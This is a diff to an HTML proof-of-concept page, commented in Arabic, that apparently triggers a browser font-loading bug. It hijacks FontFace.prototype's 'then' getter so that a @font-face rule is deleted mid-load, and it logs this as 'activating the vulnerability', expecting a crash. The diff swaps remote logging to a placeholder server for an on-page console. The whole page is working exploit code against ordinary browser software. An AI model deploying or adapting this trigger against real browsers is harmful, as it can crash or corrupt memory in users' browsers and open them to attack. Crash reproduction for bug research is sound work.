@@ -1,43 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style id="s">
-        @font-face { font-family: 'x'; src: url('nonexistent.woff'); }
+    <style>
+        /* ستايل لوحة الكونسول داخل الصفحة */
+        #console-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 300px;
+            background: rgba(0, 0, 0, 0.85); color: #00FF00; font-family: monospace;
+            padding: 10px; overflow-y: scroll; z-index: 9999; font-size: 14px;
+        }
     </style>
 </head>
 <body>
-    <h1>مراقب النظام - وضع البحث</h1>
-    <script>
-        // إعداد الاتصال بالكونسول البعيد
-        const REMOTE_URL = "https://your-server.com/log"; // ضع رابط السيرفر هنا
+    <div id="console-overlay"></div>
 
-        function remoteLog(msg) {
-            fetch(REMOTE_URL, {
-                method: 'POST',
-                body: JSON.stringify({ log: msg, time: new Date().toLocaleTimeString() })
-            });
+    <style id="s">
+        @font-face { font-family: 'x'; src: url('nonexistent.woff'); }
+    </style>
+
+    <script>
+        // دالة لعرض السجلات داخل الصفحة
+        function log(msg) {
+            const el = document.getElementById('console-overlay');
+            el.innerHTML += `> ${msg}<br>`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        window.onload = async () => {
-            remoteLog("بدء تشغيل عملية الاختبار...");
+        // اعتراض الـ Console الأصلي
+        window.onerror = (e) => log("ERROR: " + e);
+        
+        log("بدء تشغيل أداة الاختبار...");
 
+        window.onload = async () => {
+            log("تجهيز الـ FontFace...");
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
-            
+
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
-                    remoteLog("تم اعتراض الـ Promise - بدء الثغرة");
-                    document.getElementById('s').sheet.deleteRule(0);
+                    log("!!! تم اعتراض الـ then - تفعيل الثغرة الآن !!!");
+                    try {
+                        document.getElementById('s').sheet.deleteRule(0);
+                        document.body.offsetTop;
+                        log("تم استدعاء deleteRule بنجاح.");
+                    } catch(e) {
+                        log("فشل في حذف القاعدة: " + e);
+                    }
                     return undefined;
                 }
             });
 
+            log("محاولة تحميل الخط...");
             try {
-                document.fonts.load('1em x', 'AB');
-                remoteLog("تم استدعاء load بنجاح");
+                await document.fonts.load('1em x', 'AB');
+                log("تم تحميل الخط (لم يحدث انهيار).");
             } catch (e) {
-                remoteLog("خطأ في التنفيذ: " + e.message);
+                log("فشل التحميل (النتيجة المتوقعة): " + e);
             }
         };
     </script>
